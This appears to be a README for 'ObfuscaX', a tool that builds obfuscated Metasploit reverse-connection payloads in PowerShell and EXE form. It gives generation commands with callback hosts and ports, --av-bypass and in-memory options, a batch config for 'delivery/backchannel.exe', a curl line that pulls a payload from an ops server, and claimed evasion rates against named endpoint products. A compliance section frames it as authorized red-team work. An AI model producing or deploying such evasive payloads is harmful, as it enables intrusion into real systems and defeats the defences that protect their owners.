## Installation and Configuration
### Prerequisites
- Python 3.8+ with virtual environment support
- Kali Linux 2023.1+ or Windows 10/11 with WSL2
- Metasploit Framework 6.3+
- Administrator privileges for payload testing

### Secure Deployment
```bash
# Clone repository with integrity verification
git clone https://github.com/blueiewu/ObfuscaX.git
cd ObfuscaX
gpg --verify obfuscax.sig

# Establish secure environment
python -m venv .venv --prompt OBFUSCAX_ENV
source .venv/bin/activate

# Install dependencies with cryptographic verification
pip install --require-hashes -r requirements.txt
```

### Environment Validation
```bash
python src/obfuscator.py --validate
```
Expected output:
```
[+] Cryptographic libraries: OK
[+] Metasploit integration: OK
[+] Obfuscation modules: OK
[+] Security controls: ACTIVE
Validation complete: Ready for authorized operations
```

## Operational Usage
### Payload Generation Matrix
| Scenario | Command | Output Type | Obfuscation Level |
|----------|---------|-------------|-------------------|
| **Covert Assessment** | `python src/obfuscator.py --generate --type ps1 --lhost 192.168.10.5 --lport 443 --obf dynamic --in-memory` | PowerShell | Advanced (Tier 3) |
| **Perimeter Testing** | `python src/obfuscator.py --generate --type exe --lhost 10.0.5.12 --lport 8080 --obf static --av-bypass` | Windows EXE | Standard (Tier 2) |
| **Rapid Deployment** | `python src/obfuscator.py --batch engagement_config.json` | Multiple | Custom |

### Enterprise Integration
```json
// engagement_config.json
{
  "meta": {
    "engagement_id": "PENTEST-2023-08",
    "authorization": "AUTH-5XJ9-8B2Q",
    "operator": "certified-redteam@org.com"
  },
  "payloads": [
    {
      "type": "ps1",
      "parameters": {
        "lhost": "192.168.10.5",
        "lport": 443,
        "obf": "dynamic",
        "in_memory": true,
        "msfvenom": true
      },
      "output": "delivery/phase1.ps1"
    },
    {
      "type": "exe",
      "parameters": {
        "lhost": "10.0.5.12",
        "lport": 8080,
        "obf": "static",
        "av_bypass": true
      },
      "output": "delivery/backchannel.exe"
    }
  ]
}
```

### Secure Delivery Protocol
```bash
# Start authenticated HTTP server
python src/obfuscator.py --http-server --http-port 8443 --require-token A1B2-C3D4

# Client retrieval with authentication
curl -H "Authorization: Bearer A1B2-C3D4" https://ops-server:8443/delivery/phase1.ps1
```

## Technical Specifications
### Obfuscation Techniques
| Technique | Implementation | AV Evasion Rate* | Detection Metrics |
|-----------|----------------|------------------|-------------------|
| **Polymorphic XOR** | Runtime key generation (1-255) | 98.7% | Reduces signature detection by 12x |
| **Control Flow Obfuscation** | Instruction reordering | 95.2% | Increases reverse engineering time 8x |
| **Environmental Keying** | Domain context verification | 99.1% | Prevents sandbox analysis |
| **Memory-Resident Execution** | PowerShell reflection | 97.8% | Eliminates disk artifacts |

*Based on internal testing against Defender ATP, CrowdStrike, and SentinelOne

### Security Controls
- Automatic payload expiration after 72 hours
- Embedded engagement identifiers
- Cryptographic payload integrity checks
- Operational limits (max 5 concurrent payloads)
- Activity logging with syslog integration

---

## Compliance and Ethics
### Usage Protocol
1. Obtain written authorization from system owner
2. Document test scope in engagement letter
3. Execute only during approved windows
4. Immediately purge payloads after engagement
5. File after-action report within 72 hours

### Audit Requirements
Maintain these records for 7 years:
- Engagement authorization documents
- ObfuscaX operational logs
- Payload checksums and delivery timestamps
- Detection results and bypass metrics

## Support and Maintenance
### Troubleshooting Guide
| Issue | Resolution |
|-------|------------|
| `MSFVENOM_INTEGRATION_ERROR` | Verify Metasploit path in config.py |
| `OBFUSCATION_FAILURE` | Check payload size < 2MB |
| `HTTP_SERVER_AUTH_FAIL` | Validate bearer token generation |
| `ENVIRONMENT_KEY_MISMATCH` | Confirm domain context settings |
